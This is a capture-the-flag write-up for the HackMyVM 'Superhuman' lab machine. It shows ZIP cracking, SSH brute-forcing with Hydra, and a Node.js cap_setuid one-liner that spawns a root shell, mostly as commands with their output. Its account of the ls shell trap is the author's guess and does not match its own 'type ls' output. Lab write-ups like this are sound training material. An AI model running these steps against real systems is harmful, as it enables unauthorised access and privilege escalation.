# Superhuman

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Superhuman | cromiphi | Beginner | HackMyVM |

**Summary:** Superhuman is a beginner-level HackMyVM machine built around a layered information-gathering chain. Host discovery reveals an Apache web server on port 80 alongside SSH on port 22. Web enumeration uncovers a Base85-encoded text file (`notes-tips.txt`) and a JPEG image of Nietzsche. Decoding the Base85 blob in CyberChef reveals a hidden note about a password-protected ZIP file (`salome_and_me.zip`). The ZIP is cracked with John the Ripper and rockyou.txt, and its contents — a poem written in the voice of a user named `fred` — are used to build a targeted password list. Hydra successfully brute-forces fred's SSH credentials from the poem's vocabulary. The SSH session contains a shell trap: the `ls` command has been secretly renamed/aliased so that running it executes a different binary (`lol`) that terminates the session. Bypassing this requires using glob expansion (`echo *`) and `grep` for file inspection. Privilege escalation is straightforward: Node.js has the `cap_setuid` Linux capability set, allowing a one-liner to call `process.setuid(0)` and spawn a root bash shell.

---

## Reconnaissance

### Network Discovery

The target was identified on the local network using a custom PowerShell scanning script:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.125 08:00:27:7D:89:03 VirtualBox
```

The MAC vendor `VirtualBox` confirms this is the CTF target at **192.168.100.125**.

### Port Scanning

A full-port Nmap scan with service and version detection was run against the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ nmap -sC -sV -p- -T4 192.168.100.125
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 22:35 WIB
Nmap scan report for 192.168.100.125
Host is up (0.0020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9e:41:5a:43:d8:b3:31:18:0f:2e:32:36:cf:68:c4:b7 (RSA)
|   256 6f:24:81:b4:3d:e5:b9:c8:47:bf:b2:8b:bf:41:2d:51 (ECDSA)
|_  256 49:5f:c0:7a:42:20:76:76:d5:29:1a:65:bf:87:d2:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.93 seconds
```

**Open ports:**
- **22/tcp** — OpenSSH 7.9p1 (Debian 10)
- **80/tcp** — Apache httpd 2.4.38 (Debian)

---

## Web Enumeration

### Hosts Entry & HTTP Headers

The hostname `superhuman.hmv` was added to `/etc/hosts` and the site was probed with `curl`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ echo "192.168.100.125 superhuman.hmv" | sudo tee -a /etc/hosts
[sudo] password for ouba:
192.168.100.125 superhuman.hmv

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ grep 192.168.100.125 /etc/hosts
192.168.100.125 superhuman.hmv
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ curl -I http://superhuman.hmv/
HTTP/1.1 200 OK
Date: Sat, 21 Feb 2026 15:43:59 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Wed, 31 Mar 2021 09:22:03 GMT
ETag: "292-5bed1a5d204c0"
Accept-Ranges: bytes
Content-Length: 658
Vary: Accept-Encoding
Content-Type: text/html


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ curl -i http://superhuman.hmv/
HTTP/1.1 200 OK
Date: Sat, 21 Feb 2026 15:44:05 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Wed, 31 Mar 2021 09:22:03 GMT
ETag: "292-5bed1a5d204c0"
Accept-Ranges: bytes
Content-Length: 658
Vary: Accept-Encoding
Content-Type: text/html

<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252"></head><body><p><img src="index_fichiers/nietzsche.jpg" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
............................[VERY LONG SPACES]...........................
<!-- If your eye was sharper, you would see everything in motion, lol -->
</body></html>
```

The HTML source contains a notable comment: `<!-- If your eye was sharper, you would see everything in motion, lol -->` — a hint that something is hidden, and a playful reference to the philosopher Nietzsche. The page also references a JPEG image of Nietzsche loaded from `index_fichiers/nietzsche.jpg`.

### Directory & File Enumeration with Feroxbuster

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ feroxbuster -u http://superhuman.hmv/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -x txt,php,html,jpg,zip,bak,pem,log

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://superhuman.hmv/
 🚩  In-Scope Url          │ superhuman.hmv
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, html, jpg, zip, bak, pem, log]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      356l       28w      658c http://superhuman.hmv/
200      GET      356l       28w      658c http://superhuman.hmv/index.html
200      GET       97l      537w    39223c http://superhuman.hmv/nietzsche.jpg
200      GET        1l        1w      358c http://superhuman.hmv/notes-tips.txt
```

Two interesting files were discovered:
- `nietzsche.jpg` — the Nietzsche portrait image (39 KB)
- `notes-tips.txt` — a one-line, 358-character file

### Steganography Investigation on `nietzsche.jpg`

The image was downloaded and inspected for hidden data:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ wget http://superhuman.hmv/nietzsche.jpg
--2026-02-21 22:56:21--  http://superhuman.hmv/nietzsche.jpg
Connecting to 192.168.100.125:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22211 (22K) [image/jpeg]
Saving to: 'nietzsche.jpg'

nietzsche.jpg                     100%[============================================================>]  21.69K  --.-KB/s    in 0.001s

2026-02-21 22:56:21 (16.9 MB/s) - 'nietzsche.jpg' saved [22211/22211]
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ stegseek nietzsche.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.59% (132.9 MB)
[!] error: Could not find a valid passphrase.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ exiftool nietzsche.jpg
ExifTool Version Number         : 13.36
File Name                       : nietzsche.jpg
Directory                       : .
File Size                       : 22 kB
File Modification Date/Time     : 2021:03:31 16:22:03+07:00
File Access Date/Time           : 2026:02:21 22:56:27+07:00
File Inode Change Date/Time     : 2026:02:21 22:56:21+07:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 457
Image Height                    : 606
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 457x606
Megapixels                      : 0.277

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ steghide info nietzsche.jpg
"nietzsche.jpg":
  format: jpeg
  capacity: 1.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

No passphrase was recoverable from `nietzsche.jpg` via `stegseek` or `steghide`. The EXIF metadata contains no embedded secrets either. Attention shifts to `notes-tips.txt`.

### Decoding `notes-tips.txt` — Base85

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ curl http://superhuman.hmv/notes-tips.txt
F(&m'D.Oi#De4!--ZgJT@;^00D.P7@8LJ?tF)N1B@:UuC/g+jUD'3nBEb-A+De'u)F!,")@:UuC/g(Km+CoM$DJL@Q+Dbb6ATDi7De:+g@<HBpDImi@/hSb!FDl(?A9)g1CERG3Cb?i%-Z!TAGB.D>AKYYtEZed5E,T<)+CT.u+EM4--Z!TAA7]grEb-A1AM,)s-Z!TADIIBn+DGp?F(&m'D.R'_DId*=59NN?A8c?5F<G@:Dg*f@$:u@WF`VXIDJsV>AoD^&ATT&:D]j+0G%De1F<G"0A0>i6F<G!7B5_^!+D#e>ASuR'Df-\,ARf.kF(HIc+CoD.-ZgJE@<Q3)D09?%+EMXCEa`Tl/c
```

The content is clearly not plain text. The character set (backticks, `!`, `^`, mixed alphanumerics) matches **Base85 with the `!-u` alphabet** (also known as ASCII85 variant). The string was decoded using **CyberChef** with the "From Base85" operation (Alphabet: `!-u`, Remove non-alphabet chars: enabled):

![](image.png)

**Decoded output:**
> `salome doesn't want me, I'm so sad... i'm sure god is dead... I drank 6 liters of Paulaner.... too drunk lol. I'll write her a poem and she'll desire me. I'll name it salome_and_?? I don't know. I must not forget to save it and put a good extension because I don't have much storage.`

This is a crucial clue. The note reveals:
- A user is writing a poem about someone named **Salome**.
- The file will be named `salome_and_??` with a small/compressed extension — strongly implying **`salome_and_me.zip`**.

---

## Initial Access

### Retrieving and Cracking `salome_and_me.zip`

Following the hint from the decoded message, the ZIP file was downloaded directly:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ wget http://superhuman.hmv/salome_and_me.zip
--2026-02-22 01:21:35--  http://superhuman.hmv/salome_and_me.zip
Resolving superhuman.hmv (superhuman.hmv)... 192.168.100.125
Connecting to superhuman.hmv (superhuman.hmv)|192.168.100.125|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 452 [application/zip]
Saving to: 'salome_and_me.zip'

salome_and_me.zi 100%[=========>]     452  --.-KB/s    in 0s

2026-02-22 01:21:35 (24.8 MB/s) - 'salome_and_me.zip' saved [452/452]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ unzip salome_and_me.zip
Archive:  salome_and_me.zip
[salome_and_me.zip] salome_and_me.txt password:
   skipping: salome_and_me.txt       incorrect password
```

The ZIP is password-protected. `zip2john` was used to extract a hash for offline cracking:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ zip2john salome_and_me.zip > hash
ver 2.0 efh 5455 efh 7875 salome_and_me.zip/salome_and_me.txt PKZIP Encr: TS_chk, cmplen=252, decmplen=443, crc=91CF0992 ts=393B cs=393b type=8

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
t[REDACTED]           (salome_and_me.zip/salome_and_me.txt)
1g 0:00:00:00 DONE (2026-02-22 01:21) 14.28g/s 117028p/s 117028c/s 117028C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

John cracked the ZIP password instantly from rockyou.txt. The ZIP was then extracted:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ unzip salome_and_me.zip
Archive:  salome_and_me.zip
[salome_and_me.zip] salome_and_me.txt password:
  inflating: salome_and_me.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ cat salome_and_me.txt

----------------------------------------------------

             GREAT POEM FOR SALOME

----------------------------------------------------


My name is fred,
And tonight I'm sad, lonely and scared,
Because my love Salome prefers schopenhauer, asshole,
I hate him he's stupid, ugly and a peephole,
My darling I offered you a great switch,
And now you reject my love, bitch
I don't give a fuck, I'll go with another lady,
And she'll call me BABY!
```

The poem confirms the username is **`fred`** ("My name is fred"). The poem's vocabulary likely contains fred's SSH password.

### Building a Password List from the Poem

Every unique word from the poem was extracted as a targeted wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ cat salome_and_me.txt | tr -s '[:space:][:punct:]' '\n' | sort -u > pass.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ tail -n 7 pass.txt
stupid
switch
t
tonight
ugly
with
you
```

### SSH Brute-Force with Hydra

Hydra was used to brute-force SSH with username `fred` and the poem-derived wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ hydra -l fred -P pass.txt ssh://192.168.100.125
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-22 01:31:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 53 login tries (l:1/p:53), ~4 tries per task
[DATA] attacking ssh://192.168.100.125:22/
[22][ssh] host: 192.168.100.125   login: fred   password: s[REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-22 01:31:43
```

Credentials found: **`fred` / `s[REDACTED]`**

### SSH Login — The Shell Trap

The first two attempts to log in revealed a peculiar behaviour — the connection was immediately terminated after running `ls`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ ssh fred@192.168.100.125
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
fred@192.168.100.125's password:
Linux superhuman 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb 21 13:33:16 2026 from 192.168.100.1
fred@superhuman:~$ id
uid=1000(fred) gid=1000(fred) groups=1000(fred),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
fred@superhuman:~$ ls
lol
Connection to 192.168.100.125 closed.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ ssh fred@192.168.100.125
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
fred@192.168.100.125's password:
Linux superhuman 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb 21 13:34:27 2026 from 192.168.100.1
fred@superhuman:~$ ls
lol
Connection to 192.168.100.125 closed.
```

Typing `ls` printed a single entry named `lol` and immediately kicked the session. This is a **shell trap**: the `ls` command has been replaced or aliased to a binary/script named `lol` that terminates the session when invoked. The hint in `cmd.txt` (read in the third attempt) confirms this: `"ls" command has a new name?!! WTF !`

### Bypassing the Shell Trap

In the third session, standard shell built-ins and glob expansion were used instead of `ls`, and `grep ""` was used instead of `cat` to read files — all of which bypass the trap:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/superhuman]
└─$ ssh fred@192.168.100.125
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
fred@192.168.100.125's password:
Linux superhuman 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb 21 13:34:33 2026 from 192.168.100.1
fred@superhuman:~$ echo *
cmd.txt user.txt
fred@superhuman:~$ echo .*
. .. .bash_history .bash_logout .bashrc .local .profile
fred@superhuman:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
fred@superhuman:~$ echo $SHELL
/bin/bash
fred@superhuman:~$ type ls
ls is aliased to `ls --color=auto'
fred@superhuman:~$ grep "" cmd.txt
"ls" command has a new name ?!! WTF !
fred@superhuman:~$ which ls
/usr/bin/ls
```

- `echo *` (glob expansion) lists `cmd.txt` and `user.txt` — the user flag is here.
- `echo .*` reveals standard dotfiles in the home directory.
- `grep "" cmd.txt` reads the file without invoking `cat` or `ls`.
- `cmd.txt` confirms that `ls` was given "a new name" — the aliased `ls --color=auto` resolves to a binary that kills the session when called.

**User flag is located at `/home/fred/user.txt`.**

---

## Privilege Escalation

### Linux Capabilities Enumeration

From within the session, Linux capabilities were enumerated recursively:

```bash
fred@superhuman:/opt$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/node = cap_setuid+ep
```

The critical finding: **`/usr/bin/node` has `cap_setuid+ep`**. This means the Node.js binary is permitted to call `setuid()` to set its process UID to any value — including **0 (root)** — without being root itself. This is a well-known privilege escalation vector.

### Exploiting Node.js `cap_setuid` Capability

The following one-liner calls `process.setuid(0)` to become root, then spawns an interactive bash shell with full stdio inheritance:

```bash
fred@superhuman:/opt$ node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
root@superhuman:/opt# id
uid=0(root) gid=1000(fred) groups=1000(fred),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
root@superhuman:/opt# su - root
root@superhuman:~# id
uid=0(root) gid=0(root) groups=0(root)
root@superhuman:~# whoami
root
root@superhuman:~# hostname
superhuman
```

`su - root` was then used to obtain a fully clean root environment (`uid=0 gid=0`).

### Flags

```bash
root@superhuman:~# grep "" /root/root.txt /home/fred/user.txt
/root/root.txt:Imt[REDACTED]
/home/fred/user.txt:Ine[REDACTED]
```

Both flags were successfully retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: Full-port Nmap scan identified **port 22 (OpenSSH 7.9p1)** and **port 80 (Apache 2.4.38)** on the target at `192.168.100.125`. Web enumeration with Feroxbuster discovered `nietzsche.jpg` and `notes-tips.txt`.

2. **Vulnerability Discovery**: `notes-tips.txt` contained a **Base85-encoded** string (alphabet `!-u`). Decoding it in CyberChef revealed a note hinting at a file named `salome_and_me.zip` stored on the web server with minimal storage constraints (pointing to `.zip` extension).

3. **Exploitation**: `salome_and_me.zip` was downloaded from the server, cracked with `zip2john` + John the Ripper (rockyou.txt), and extracted. The contents — a poem authored by `fred` — provided both the **SSH username** and a vocabulary set used to build a targeted wordlist. Hydra brute-forced fred's SSH password from this wordlist.

4. **Internal Enumeration**: SSH access as `fred` was immediately complicated by a **shell trap**: the `ls` command was aliased to a session-killing binary (`lol`). Standard shell builtins (`echo *`, `grep`) were used to enumerate the filesystem without triggering the trap. `getcap -r /` revealed that `/usr/bin/node` had **`cap_setuid+ep`** set.

5. **Privilege Escalation**: The Node.js `cap_setuid` capability was exploited with a one-liner (`process.setuid(0)`) to spawn a root bash shell, followed by `su - root` to obtain a full clean root session. Both `user.txt` and `root.txt` flags were read.
